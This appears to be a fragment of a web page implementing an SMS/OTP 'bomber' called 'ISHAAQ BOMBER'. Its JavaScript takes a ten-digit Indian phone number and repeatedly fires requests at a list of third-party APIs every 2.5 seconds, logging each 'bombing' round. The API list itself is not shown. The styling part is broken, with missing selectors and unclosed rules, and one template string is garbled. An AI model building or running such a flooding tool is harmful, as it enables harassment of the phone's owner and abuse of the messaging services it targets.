      text-align: center;
      background: rgba(0, 0, 0, 0.9);
      border: 4px solid #00ffff;
      border-radius: 20px;
      color: #fff;
      box-shadow:

      transition: all 0.3s;

    input:focus {
      outline: none;
      border-color: #ff00ff;
      box-shadow: 
        0 0 45px #ff00ff,
        inset 0 0 35px rgba(255, 0, 255, 0.6);

    .btn-container {
      margin: 20px 0 30px 0;
      display: flex;
      gap: 20px;
      justify-content: center;
      flex-wrap: wrap;
    }

      padding: 20px 45px;

      color: #fff;

      cursor: pointer;
      text-transform: uppercase;
      letter-spacing: 4px;
      box-shadow: 0 0 35px #00ffff;
      transition: all 0.4s;

      border-color: #00ff88;
      box-shadow: 0 0 35px #00ff88;
    }

    #startBtn:hover {
      background: #00ff88;
      color: #000;

    }

    #stopBtn {
      border-color: #ff0088;
      box-shadow: 0 0 35px #ff0088;
      display: none;
    }

      background: #ff0088;
      color: #fff;
      transform: scale(1.1);

      text-shadow: 0 0 20px #00ff00;

      0% { opacity: 0.6; }

      0% { top: -30px; }
      100% { top: 110%; }

    let interval = null;
    let count = 0;

    function log(message, color = "#00ffcc") {
      const logDiv = document.getElementById('log');
      const time = new Date().toLocaleTimeString('en-IN');
      logDiv.innerHTML += `<span style="color:\( {color}">[ \){time}] ${message}</span><br>`;
      logDiv.scrollTop = logDiv.scrollHeight;
    }

    async function sendBomb(api, phone) {
      try {
        let url = typeof api.url === 'function' ? api.url(phone) : api.url;
        let body = api.data ? (typeof api.data === 'function' ? api.data(phone) : api.data) : null;

        const options = { method: api.method, headers: api.headers || {} };
        if (body && api.method !== "GET") options.body = body;

        const res = await fetch(url, options);
        if (res.ok) {
          log(`✅ ${api.name} → SUCCESS`, "#00ff88");
        } else {
          log(`⚠️ ${api.name} → ${res.status}`, "#ffdd00");
        }
      } catch (e) {
        log(`❌ ${api.name} → FAILED`, "#ff4444");
      }
    }

    function startBombing() {
      const phone = document.getElementById('phone').value.trim();

      if (!/^\d{10}$/.test(phone)) {
        alert("❌ Please enter valid 10 digit Indian number!");
        return;
      }

      // Show Stop button and hide Start
      document.getElementById('startBtn').style.display = 'none';
      document.getElementById('stopBtn').style.display = 'inline-block';

      document.getElementById('status').innerHTML = `🚀 BOMBING ACTIVE ON <span style="color:#ff00ff">${phone}</span>`;
      document.getElementById('status').style.color = "#00ff88";

      log(`🚀 ISHAAQ BOMBER STARTED ON ${phone}`, "#ffff00");
      log("Sending requests to all APIs...", "#00ffff");

      count = 0;

      interval = setInterval(() => {
        count++;
        log(`🔥 ROUND ${count} - Bombing in progress...`, "#00ffff");

        ULTIMATE_APIS.forEach(api => sendBomb(api, phone));
      }, 2500);
    }

    function stopBombing() {
      if (interval) {
        clearInterval(interval);
        interval = null;
      }

      document.getElementById('startBtn').style.display = 'inline-block';
      document.getElementById('stopBtn').style.display = 'none';

      document.getElementById('status').innerHTML = `⛔ BOMBING STOPPED`;
      document.getElementById('status').style.color = "#ff0088";

      log("⛔ BOMBING STOPPED BY USER", "#ff0088");
    }

    window.onload = () => {
      document.getElementById('phone').focus();
    };
